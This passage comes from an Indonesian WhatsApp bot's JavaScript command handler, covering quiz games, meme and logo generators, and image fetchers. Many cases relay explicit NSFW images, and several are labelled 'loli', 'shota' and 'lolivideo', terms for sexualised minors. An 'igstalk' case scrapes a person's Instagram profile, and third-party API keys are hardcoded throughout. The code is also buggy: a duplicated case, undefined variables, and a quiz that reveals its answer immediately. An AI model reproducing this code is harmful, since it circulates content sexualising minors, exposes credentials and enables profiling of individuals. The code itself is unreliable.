					client.sendMessage(from, '_20 Detik lagi_…', text) // ur cods
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, '_30 Detik lagi_…', text) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, '_40 Detik lagi_…', text) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, anu.nama, text, {quoted: mek })
					}, 0) // 1000 = 1s,
					break;					 
					case 'tebakbendera'://Subscribe Hans BOT & Msz Pro			         
					anu = await fetchJson(`https://janbot-api.herokuapp.com/api/kuis/tebakbendera`, {method: 'get'})
					setTimeout( () => {
				    client.sendMessage(from, '*◉ Jawaban :* '+anu.nama, text, {quoted: mek})
					}, 50000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, '_10 Detik lagi…_', text) // ur cods
					}, 40000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, '_20 Detik lagi_…', text) // ur cods
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, '_30 Detik lagi_…', text) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, '_40 Detik lagi_…', text) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, anu.bendera, text, {quoted: mek })
					}, 0) // 1000 = 1s,
					break; 		         
			case 'tebakliriklagu':
			        //Case By PojanGanz
                 anu = await fetchJson(`https://janbot-api.herokuapp.com/api/kuis/tebaklirik`)
				teks = `Tebak : ${anu.question}`
                reply(teks)
                 gayakwwokw = `Jawaban : ${anu.answer}`
				setTimeout( () => {
				client.sendMessage(from, tebak, text, {quoted: mek})
				}, 30000)
				setTimeout( () => {
				client.sendMessage(from, '_10 Detik lagi..._', text)
				}, 20000)
				setTimeout( () => {
				client.sendMessage(from, '_20 Detik lagi..._', text)
				}, 10000)
				setTimeout( () => {
				client.sendMessage(from, '_30 Detik lagi..._', text)
				}, 2500)
				setTimeout( () => {

				}, 0)
                client.sendMessage(from, gayakwwokw, text, {quoted: mek})				 
				break;
					case 'tebakgambar1':
			        //Case By PojanGanz               
				anu = await fetchJson(`https://janbot-api.herokuapp.com/api/kuis/tebakgambar`)
				ojan = await getBuffer(anu.image)
				tebak = `➸ Jawaban : ${anu.jawaban}`
				setTimeout( () => {
				client.sendMessage(from, tebak, text, {quoted: mek})
				}, 30000)
				setTimeout( () => {
				client.sendMessage(from, '_10 Detik lagi..._', text)
				}, 20000)
				setTimeout( () => {
				client.sendMessage(from, '_20 Detik lagi..._', text)
				}, 10000)
				setTimeout( () => {
				client.sendMessage(from, '_30 Detik lagi..._', text)
				}, 2500)
				setTimeout( () => {
				client.sendMessage(from, ojan, image, { caption: '_Tebak bro!!! gw ksi 30 dtk untk menjawab..', quoted: mek})
				}, 0)				 
				break;				
				case 'randomnekon':				 
				anu = await fetchJson(`http://zekais-api.herokuapp.com/randomneko`)
				dapuhy = await getBuffer(anu.result)
				client.sendMessage(from, dapuhy, image, {quoted: ftroli})				
				break;
				case 'randomlolin':				 
				anu = await fetchJson(`http://zekais-api.herokuapp.com/randomloli`)
				dapuhy = await getBuffer(anu.result)
				client.sendMessage(from, dapuhy, image, {quoted: ftroli})				
				break;
				case 'randommilfn':				 
				anu = await fetchJson(`http://zekais-api.herokuapp.com/randomilf`)
				dapuhy = await getBuffer(anu.result)
				client.sendMessage(from, dapuhy, image, {quoted: ftroli})				
				break;
				case 'waifu3':     
waifu = await getBuffer(`https://xdev-api.herokuapp.com/waifu`)
client.sendMessage(from, waifu, image, {quoted: ftroli})
break;
case 'stickmeme':							
if(!q) return reply(`Example :Reply sticker dengan Caption  ${prefix + command} Senku` )
if (mek.message.extendedTextMessage != undefined || mek.message.extendedTextMessage != null) {
ger = JSON.parse(JSON.stringify(sen).replace('quotedM','m')).message.extendedTextMessage.contextInfo
owgi = await client.downloadMediaMessage(ger)
await fs.writeFileSync(`./stickmeme.jpeg`, owgi)
var imgbb = require('imgbb-uploader')
anu = await imgbb("68cb5bee517bce4f74b0e910a5d96346", './stickmeme.jpeg')
teks = `${anu.display_url}`
sendStickerUrl(from, `https://pecundang.herokuapp.com/api/stickermeme?url=${teks}&teks=${q}`, sen)
fs.unlinkSync('./stickmeme.jpeg')
}
break;
      case 'memeimg':
       case 'memegen':                    
              top = arg.split('|')[0]
              bottom = arg.split('|')[1]
              var imgbb = require('imgbb-uploader')
              if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length > 0) {
              reply(mess.wait)
              ger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
              owgi = await client.downloadAndSaveMediaMessage(ger)
              anu = await imgbb("39d895963468b814fad0514bd28787e2", owgi)
              teks = `${anu.display_url}`
              ranp = getRandom('.gif')
              rano = getRandom('.webp')
              anu1 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${teks}`
              sendMediaURL(from, `${anu1}`, mess.success)
              } else {
              reply('Gunakan foto/stiker!')
}
               break;
			case 'chiisaihentai':
case 'trapp':
case 'blowjobb':
case 'yaoii':
case 'ecchii':
case 'ahegao':
case 'hololewd':
case 'sideoppai':
case 'animefeets':
case 'animebooty':
case 'animethighss':
case 'hentaiparadise':
case 'animearmpits':
case 'hentaifemdom':
case 'lewdanimegirls':
case 'biganimetiddies':
case 'animebellybutton':
case 'hentai4everyone':
reply (mess.wait)
buff = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/${command}?apikey=2d3962dbfca3fd4a7f6f9348`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
imageMsg = (await client.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
buttonsMessage = {footerText:'jangan lupa donasi bos', imageMessage: imageMsg,
contentText:`©Xtream bot`,buttons,headerType:4}
prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli})
client.relayWAMessage(prep)
break;
case 'bjj':
case 'eroo':
case 'cum':
case 'feett':
case 'yurii':
case 'trapp':
case 'lewdd':
case 'feedd':
case 'eronn':
case 'soloo':
case 'gasm':
case 'poke':
case 'anall':
case 'holo':
case 'tits':
case 'kuni':
case 'kisss':
case 'erok':
case 'smugg':
case 'baka':
case 'solog':
case 'feetg':
case 'lewdk':
case 'waifuuu':
case 'pussyy':
case 'femdom':
case 'cuddle':
case 'hentai':
case 'eroyuri':
case 'cum_jpg':
case 'blowjob':
case 'erofeet':
case 'holoero':
case 'classic':
case 'erokemo':
case 'fox_girl':
case 'futanari':
case 'lewdkemo':
case 'wallpaper':
case 'pussy_jpg':
case 'kemonomimi':
case 'nsfw_avatar':
reply (mess.wait)
buff = await getBuffer(`https://api.lolhuman.xyz/api/random2/${command}?apikey=2d3962dbfca3fd4a7f6f9348`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
imageMsg = (await client.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
buttonsMessage = {footerText:'jangan lupa donasi bos', imageMessage: imageMsg,
contentText:`©Xtream bot`,buttons,headerType:4}
prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli})
client.relayWAMessage(prep)
break
case 'ppcp':
case 'ppcouple':
anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/ppcouple?apikey=idoganzkyOgiwara`)
buff1 = await getBuffer(anu.result.male)
buttons = [{buttonId: `${prefix}infoig`,buttonText:{displayText: `©Xtream bot`},type:1}]
imageMsg = (await client.prepareMessageMedia(buff1, "imageMessage", { thumbnail: buff1, })).imageMessage
buttonsMessage = {footerText:'jangan lupa donasi bos', imageMessage: imageMsg,
contentText:`Cowo`,buttons,headerType:4}
prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli})
client.relayWAMessage(prep)
buff2 = await getBuffer(anu.result.female)
buttons = [{buttonId: `${prefix}infoig`,buttonText:{displayText: `©Xtream bot`},type:1}]
imageMsg = (await client.prepareMessageMedia(buff2, "imageMessage", { thumbnail: buff2, })).imageMessage
buttonsMessage = {footerText:'jangan lupa donasi bos', imageMessage: imageMsg,
contentText:`Cewe`,buttons,headerType:4}
prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli})
setTimeout( async () => {
 client.relayWAMessage(prep)
  }, 5000)
break
case 'meme':
case 'memek':
buff = await getBuffer ('https://leyscoders-api.herokuapp.com/api/memeindo?apikey=idoganzkyOgiwara')
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
imageMsg = (await client.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
buttonsMessage = {footerText:'jangan lupa donasi bos', imageMessage: imageMsg,
contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli})
client.relayWAMessage(prep)
break
 // Textprome //
 case 'blackpink':
 case 'neon':
 case 'greenneon':
 case 'advanceglow':
 case 'futureneon':
 case 'sandwriting':
 case 'sandsummer':
 case 'sandengraved':
 case 'metaldark':
 case 'neonlight':
 case 'holographic':
 case 'text1917':
 case 'minion':
 case 'deluxesilver':
 case 'newyearcard':
 case 'bloodfrosted':
 case 'halloween':
 case 'jokerlogo':
 case 'fireworksparkle':
 case 'natureleaves':
 case 'bokeh':
 case 'toxic':
 case 'strawberry':
 case 'box3d':
 case 'roadwarning':
 case 'breakwall':
 case 'icecold':
 case 'luxury':
 case 'cloud':
 case 'summersand':
 case 'horrorblood':
 case 'thunder':
 reply (mess.wait)
 if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
ini_txt = args.join(" ")
 buff = await getBuffer(`https://api.lolhuman.xyz/api/textprome/${command}?apikey=2d3962dbfca3fd4a7f6f9348&text=${ini_txt}`)
 buttons = [{buttonId: noprefix ? "menu" : "!"+"menu",buttonText:{displayText: `BACK MENU`},type:1}]
 imageMsg = (await client.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
 buttonsMessage = {footerText:'jangan lupa donasi bos', imageMessage: imageMsg,
 contentText:`©Xtream bot`,buttons,headerType:4}
 prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli})
 client.relayWAMessage(prep)
 break;
 case 'pornhub':
 case 'glitch':
 case 'avenger':
 case 'space':
 case 'ninjalogo':
 case 'marvelstudio':
 case 'lionlogo':
 case 'wolflogo':
 case 'steel3d':
 case 'wallgravity':
 reply (mess.wait)
 if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
txt1 = args[0]
 txt2 = args[1]
 buff = await getBuffer(`https://api.lolhuman.xyz/api/textprome2/${command}?apikey=2d3962dbfca3fd4a7f6f9348&text1=${txt1}&text2=${txt2}`)
 buttons = [{buttonId: noprefix ? "menu" : "!"+"menu",buttonText:{displayText: `BACK MENU`},type:1}]
 imageMsg = (await client.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
 buttonsMessage = {footerText:'jangan lupa donasi bos', imageMessage: imageMsg,
 contentText:`©Xtream bot`,buttons,headerType:4}
 prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli})
 client.relayWAMessage(prep)
 break;
 // Photo Oxy //
 case 'shadow':
 case 'cup':
 case 'cup1':
 case 'romance':
 case 'smoke':
 case 'burnpaper':
 case 'lovemessage':
 case 'undergrass':
 case 'love':
 case 'coffe':
 case 'woodheart':
 case 'woodenboard':
 case 'summer3d':
 case 'wolfmetal':
 case 'nature3d':
 case 'underwater':
 case 'golderrose':
 case 'summernature':
 case 'letterleaves':
 case 'glowingneon':
 case 'fallleaves':
 case 'flamming':
 case 'harrypotter':
 case 'carvedwood':
 reply (mess.wait)
 if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
ini_txt = args.join(" ")
 buff = await getBuffer(`https://api.lolhuman.xyz/api/photooxy1/${command}?apikey=2d3962dbfca3fd4a7f6f9348&text=${ini_txt}`)
 buttons = [{buttonId: noprefix ? "menu" : "!"+"menu",buttonText:{displayText: `BACK MENU`},type:1}]
 imageMsg = (await client.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
 buttonsMessage = {footerText:'jangan lupa donasi bos', imageMessage: imageMsg,
 contentText:`©Xtream bot`,buttons,headerType:4}
 prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli})
 client.relayWAMessage(prep)
 break;
 case 'ttlogo':
 case 'arcade8bit':
 case 'battlefield4':
 case 'pubg':
 reply (mess.wait)
 if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
txt1 = args[0]
 txt2 = args[1]
 buff = await getBuffer(`https://api.lolhuman.xyz/api/photooxy2/${command}?apikey=2d3962dbfca3fd4a7f6f9348&text1=${txt1}&text2=${txt2}`)
 buttons = [{buttonId: noprefix ? "menu" : "!"+"menu",buttonText:{displayText: `BACK MENU`},type:1}]
 imageMsg = (await client.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
 buttonsMessage = {footerText:'jangan lupa donasi bos', imageMessage: imageMsg,
 contentText:`©Xtream bot`,buttons,headerType:4}
 prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli})
 client.relayWAMessage(prep)
 break;
 // Ephoto 360 //
 case 'wetglass':
 case 'multicolor3d':
 case 'watercolor':
 case 'luxurygold':
 case 'galaxywallpaper':
 case 'lighttext':
 case 'beautifulflower':
 case 'puppycute':
 case 'royaltext':
 case 'heartshaped':
 case 'birthdaycake':
 case 'galaxystyle':
 case 'hologram3d':
 case 'greenneon':
 case 'glossychrome':
 case 'greenbush':
 case 'metallogo':
 case 'noeltext':
 case 'glittergold':
 case 'textcake':
 case 'starsnight':
 case 'wooden3d':
 case 'textbyname':
 case 'writegalacy':
 case 'galaxybat':
 case 'snow3d':
 case 'birthdayday':
 case 'goldplaybutton':
 case 'silverplaybutton':
 case 'freefire':
 reply (mess.wait)
 if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
ini_txt = args.join(" ")
 buff = await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/${command}?apikey=2d3962dbfca3fd4a7f6f9348&text=${ini_txt}`)
 buttons = [{buttonId: noprefix ? "menu" : "!"+"menu",buttonText:{displayText: `BACK MENU`},type:1}]
 imageMsg = (await client.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
 buttonsMessage = {footerText:'jangan lupa donasi bos', imageMessage: imageMsg,
 contentText:`©Xtream bot`,buttons,headerType:4}
 prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli})
 client.relayWAMessage(prep)
break;	 
	 case 'stalkig7':
      case 'igstalk7':
             if (args.length == 0) return reply(`Example: ${prefix + command} rimuru.chan26`)
             reply(mess.wait)
             username = args[0]
             ini_result = await fetchJson(`https://api.lolhuman.xyz/api/stalkig/${username}?apikey=2d3962dbfca3fd4a7f6f9348`)
             ini_result = ini_result.result
             ini_buffer = await getBuffer(ini_result.photo_profile)
             ini_txt = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *INSTAGRAM PROFILE*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`🐥 Username : ${ini_result.username}\`\`\`
\`\`\`🐥 Nama : ${ini_result.fullname}\`\`\`
\`\`\`🐥 Pengikut : ${ini_result.followers}\`\`\`
\`\`\`🐥 Mengikuti : ${ini_result.following}\`\`\`
\`\`\`🐥 Deskripsi : ${ini_result.bio}\`\`\`
\`\`\`🐥 Link : https://instagram.com/${ini_result.username}\`\`\`
`
             client.sendMessage(from, ini_buffer, image, { caption: ini_txt, thumbnail: Buffer.alloc(0) })
             break;                 
case 'stickmeme2':									
if(!q) return reply(`Example : Reply sticker dengan Caption ${prefix + command} Sen`)
if (mek.message.extendedTextMessage != undefined || sen.message.extendedTextMessage != null) {
ger = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
owgi = await client.downloadMediaMessage(ger)
await fs.writeFileSync(`./stickmeme.jpeg`, owgi)
var imgbb = require('imgbb-uploader')
anu = await imgbb("68cb5bee517bce4f74b0e910a5d96346", './stickmeme.jpeg')
teks = `${anu.display_url}`
sendStickerUrl(from, `https://pecundang.herokuapp.com/api/memegen3?teks=${q}&img_url=${teks}`, mek)
fs.unlinkSync('./stickmeme.jpeg')
}
break;
case 'stickmeme3':
if (!isQuotedSticker) return reply(`Format salah! Reply sticker\nContoh ${prefix + command} text|text`)
var tex1 = body.slice(12).split('|')[0]
var tex2 = body.slice(12).split('|')[1]
if (!tex2) return reply(`Format salah! Reply sticker\nContoh ${prefix + command} text|text`)
if (mek.message.extendedTextMessage != undefined || sen.message.extendedTextMessage != null) {
ger = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
owgi = await client.downloadMediaMessage(ger)
await fs.writeFileSync(`./stickmeme.jpeg`, owgi)
var imgbb = require('imgbb-uploader')
anu = await imgbb("68cb5bee517bce4f74b0e910a5d96346", './stickmeme.jpeg')
teks = `${anu.display_url}`
sendStickerUrl(from, `https://pecundang.herokuapp.com/api/memegen2?teks1=${tex1}&teks2=${tex2}&img_url=${teks}`, mek)
fs.unlinkSync('./stickmeme.jpeg')
}
break;
				case 'randomkissn':				 
				anu = await fetchJson(`http://zekais-api.herokuapp.com/randomkiss`)
				dapuhy = await getBuffer(anu.result)
				client.sendMessage(from, dapuhy, image, {quoted: ftroli})				
				break;				
				case 'randomwaifun':				 
				anu = await fetchJson(`http://zekais-api.herokuapp.com/randomwaifu`)
				dapuhy = await getBuffer(anu.result)
				client.sendMessage(from, dapuhy, image, {quoted: ftroli})				
				break;
				case 'randomhusbun':				 
				anu = await fetchJson(`http://zekais-api.herokuapp.com/randomhusbu`)
				dapuhy = await getBuffer(anu.result)
				client.sendMessage(from, dapuhy, image, {quoted: ftroli})				
				break;
				case 'randomshotan':				 
				anu = await fetchJson(`http://zekais-api.herokuapp.com/randomshota`)
				dapuhy = await getBuffer(anu.result)
				client.sendMessage(from, dapuhy, image, {quoted: ftroli})				
				break;
				case 'tebakgambar':                
					data = fs.readFileSync('./lib/tebakgambar.js');
					jsonData = JSON.parse(data);
					randIndex = Math.floor(Math.random() * jsonData.length);
					randKey = jsonData[randIndex];
					randSoal = await getBuffer(randKey.result.soalImg)
					setTimeout( () => {
					client.sendMessage(from, '*➸ Jawaban :* '+ randKey.result.jawaban +'\n', text, {quoted: mek}) // ur cods
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, '_10 Detik lagi…_', text) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, '_20 Detik lagi_…', text) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, '_30 Detik lagi_…', text) // ur cods
					}, 2500) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, randSoal, image, { caption: '_Jelaskan Apa Maksud Gambar Ini_', quoted: mek}) // ur cods
					}, 0) // 1000 = 1s,					 
					break;
					case 'tebakgambar':                
					data = fs.readFileSync('./lib/tebakgambar2.js');
					jsonData = JSON.parse(data);
					randIndex = Math.floor(Math.random() * jsonData.length);
					randKey = jsonData[randIndex];
					randSoal = await getBuffer(randKey.result.soalImg)
					setTimeout( () => {
					client.sendMessage(from, '*➸ Jawaban :* '+ randKey.result.jawaban +'\n', text, {quoted: mek}) // ur cods
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, '_10 Detik lagi…_', text) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, '_20 Detik lagi_…', text) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, '_30 Detik lagi_…', text) // ur cods
					}, 2500) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, randSoal, image, { caption: '_Jelaskan Apa Maksud Gambar Ini_', quoted: mek}) // ur cods
					}, 0) // 1000 = 1s,					 
					break;    
				case 'family100':                			
				data = fs.readFileSync('./lib/family100.js');
				fami = JSON.parse(data);
				ly100 = Math.floor(Math.random() * fami.length);
				randKey = fami[ly100];
				Pertanyaan = randKey.result.soal
					setTimeout( () => {
					client.sendMessage(from, '*➸ Jawaban :* \n```'+randKey.result.jawaban +'```', text, {quoted: mek}) // ur cods
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
					  reply('_Waktu Anda Habis_')
					}, 29000)
					setTimeout( () => {
					client.sendMessage(from, '_10 Detik lagi…_', text) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, '_20 Detik lagi_…', text) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, '_30 Detik lagi_…', text) // ur cods
					}, 2500) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, '*'+ Pertanyaan +'*', text, {quoted: mek }) // ur cods
					}, 0) // 1000 = 1s,					 
					break;
					case 'family':                			
				data = fs.readFileSync('./lib/family.js');
				fami = JSON.parse(data);
				ly100 = Math.floor(Math.random() * fami.length);
				randKey = fami[ly100];
				Pertanyaan = randKey.result.soal
					setTimeout( () => {
					client.sendMessage(from, '*➸ Jawaban :* \n```'+randKey.result.jawaban +'```', text, {quoted: mek}) // ur cods
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
					  reply('_Waktu Anda Habis_')
					}, 29000)
					setTimeout( () => {
					client.sendMessage(from, '_10 Detik lagi…_', text) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, '_20 Detik lagi_…', text) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, '_30 Detik lagi_…', text) // ur cods
					}, 2500) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, '*'+ Pertanyaan +'*', text, {quoted: mek }) // ur cods
					}, 0) // 1000 = 1s,					 
					break;  
					case 'soalmtk':			       
				anu = await fetchJson(`https://janbot-api.herokuapp.com/api/kuis/math`)
				ojan = await getBuffer(anu.soal)
				tebak = `➸ Jawaban : ${anu.jawaban}`
				setTimeout( () => {
				client.sendMessage(from, tebak, text, {quoted: mek})
				}, 30000)
				setTimeout( () => {
				client.sendMessage(from, '_10 Detik lagi..._', text)
				}, 20000)
				setTimeout( () => {
				client.sendMessage(from, '_20 Detik lagi..._', text)
				}, 10000)
				setTimeout( () => {
				client.sendMessage(from, '_30 Detik lagi..._', text)
				}, 2500)
				setTimeout( () => {
				client.sendMessage(from, ojan, image, { caption: '_Tebak bro!!! gak bisa jawab donasi ya:v_', quoted: mek})
				}, 0)				 
				break;
				case 'nulis':		                 
				if (args.length < 1) return reply(`${name} Harus Nulis Apa Kak??`)
				F = body.slice(8)				
				anu = await getBuffer(`https://api.zeks.xyz/api/nulis?text=${F}&apikey=Alphabott`)
				client.sendMessage(from, anu, image, {caption: 'Nih kak udah jadi..', quoted: mek})				
				break;
				case 'ytsilver2':		                 
				if (args.length < 1) return reply(`${prefix} Harus Nulis Apa Kak??`)
				F = body.slice(11)				
				anu = await getBuffer(`https://api.zeks.xyz/api/splaybutton?text=${F}&apikey=apivinz`)
				client.sendMessage(from, anu, image, {caption: 'Nih kak udah jadi..', quoted: mek})				
				break;
				case 'spatrick':					
					client.pa = await getBuffer(`https://api.lolhuman.xyz/api/sticker/patrick?apikey=${LolHuman}`)
					client.sendMessage(from, dppa, sticker, {quoted: ftroli})					
					break;
					case 'doge':
              reply(mess.wait)
              fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/anjing')
             .then(res => res.text())
             .then(body => {
              let tod = body.split("\n");
              let pjr = tod[Math.floor(Math.random() * tod.length)];
              client.sendMessage(from, pjr)
}
)
              break;
       case 'patrick':
              reply(mess.wait)
              fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/patrik')
             .then(res => res.text())
             .then(body => {
              let tod = body.split("\n");
              let pjr = tod[Math.floor(Math.random() * tod.length)];
              client.sendMessage(from, pjr)
}
)
              break;
       case 'gura':
       case 'gawrgura':
              reply(mess.wait)
              fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/gura')
             .then(res => res.text())
             .then(body => {
              let tod = body.split("\n");
              let pjr = tod[Math.floor(Math.random() * tod.length)];
              sendWebp(from, pjr)
}
)
              break;
       case 'animestick':
       case 'stickeranime':
              reply(mess.wait)
              fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/animestick')
             .then(res => res.text())
             .then(body => {
              let todd = body.split("\n");
              let pjrr = todd[Math.floor(Math.random() * todd.length)];
              client.sendMessage(from, pjrr)
}
)
              break;
              case 'lolii':
       case 'husbuu':
       case 'milff':
       case 'cosplay':
       case 'wallml':
       case 'ramdomido':             
              let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)).data
              let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
              fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(wipi))
		      buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1},{buttonId:`${prefix}randomido`,buttonText:{displayText:'RANDOM'},type:1}]              
               imageMsg = ( await client.prepareMessage(from, fs.readFileSync(`./${sender}.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
              buttonsMessage = {footerText:'mau beli sc? pc saya😎', imageMessage: imageMsg,
              contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
              prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
              client.relayWAMessage(prep)
              fs.unlinkSync(`./${sender}.jpeg`)
              break;
              case 'loliv':
       case 'lolivid':
       case 'lolivideo':
              reply(mess.wait)
              anu = await fetchText('https://raw.githubusercontent.com/AlvioAdjiJanuar/random/main/loli.txt')
             .then(async (body) => {
              anu = body.split('\n')
              anu = anu[Math.floor(Math.random() * anu.length)]
              sendMediaURL(from, anu)
})
             .catch(async (err) => {
              console.error(err)
              reply(`${err}`)
})
              break;
				case 'ytgold2':		                 
				if (args.length < 1) return reply(`${name} Harus Nulis Apa Kak??`)
				F = body.slice(9)				
				anu = await getBuffer(`https://api.zeks.xyz/api/gplaybutton?text=${F}&apikey=apivinz`)
				client.sendMessage(from, anu, image, {caption: 'Nih kak udah jadi..', quoted: mek})				
				break;
				case 'foliokanan':		                 
				if (args.length < 1) return reply(`${prefix} Harus Nulis Apa Kak??`)
				F = body.slice(12)				
				anu = await getBuffer(`https://zekais-api.herokuapp.com/foliokanan?text=${F}&apikey=vE52KkvP`)
				client.sendMessage(from, anu, image, {caption: 'Nih kak udah jadi..', quoted: mek})				
				break;
				case 'ff1': 
			reply('Loading...')
			  hooh = await getBuffer(`https://ojanxganz.tk/ff/img.php?nama=${q}`)
			   menu = `Nih Kak`
			   buttons = [{buttonId: `${prefix}menu`,buttonText:{displayText: 'BACK TO MENU↩️'},type:1}]
			   imageMsg = (await client.prepareMessageMedia(hooh, 'imageMessage')).imageMessage
			   buttonsMessage = {
			   contentText: `${menu}`,
			   footerText: '©By ido',
               imageMessage: imageMsg,
			   buttons: buttons,
			   headerType: 4
			   }
			   prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
			   client.relayWAMessage(prep)
			   break;
			   case 'ff2': 
			reply('Loading...')
			  hooh = await getBuffer(`https://ojanxganz.tk/ff1/img.php?nama=${q}`)
			   menu = `Nih Kak`
			   buttons = [{buttonId: `${prefix}menu`,buttonText:{displayText: 'BACK TO MENU↩️'},type:1}]
			   imageMsg = (await client.prepareMessageMedia(hooh, 'imageMessage')).imageMessage
			   buttonsMessage = {
			   contentText: `${menu}`,
			   footerText: '©By ido',
               imageMessage: imageMsg,
			   buttons: buttons,
			   headerType: 4
			   }
			   prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
			   client.relayWAMessage(prep)
			   break;
			   case 'ff3': 
			reply('Loading...')
			  hooh = await getBuffer(`https://ojanxganz.tk/ff2/img.php?nama=${q}`)
			   menu = `Nih Kak`
			   buttons = [{buttonId: `${prefix}menu`,buttonText:{displayText: 'BACK TO MENU↩️'},type:1}]
			   imageMsg = (await client.prepareMessageMedia(hooh, 'imageMessage')).imageMessage
			   buttonsMessage = {
			   contentText: `${menu}`,
			   footerText: '©By ido',
               imageMessage: imageMsg,
			   buttons: buttons,
			   headerType: 4
			   }
			   prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
			   client.relayWAMessage(prep)
			   break;
			   case 'tolol1': 
			reply('Loading...')
			  hooh = await getBuffer(`https://ojanxganz.tk/tolol/img.php?nama=${q}`)
			   menu = `Nih Kak`
			   buttons = [{buttonId: `${prefix}menu`,buttonText:{displayText: 'BACK TO MENU↩️'},type:1}]
			   imageMsg = (await client.prepareMessageMedia(hooh, 'imageMessage')).imageMessage
			   buttonsMessage = {
			   contentText: `${menu}`,
			   footerText: '©By ido',
               imageMessage: imageMsg,
			   buttons: buttons,
			   headerType: 4
			   }
			   prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
			   client.relayWAMessage(prep)
			   break;
				 case 'kusonime':                     
                   F = body.slice(10)
                   anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/kuso?q=${F}`)
                   anu1 = `➻ *INFO* : ${anu.sinopsis}\n`
                   reply(anu1)
                   break;      
       case 'samehadaku':                     
                   F = body.slice(12)
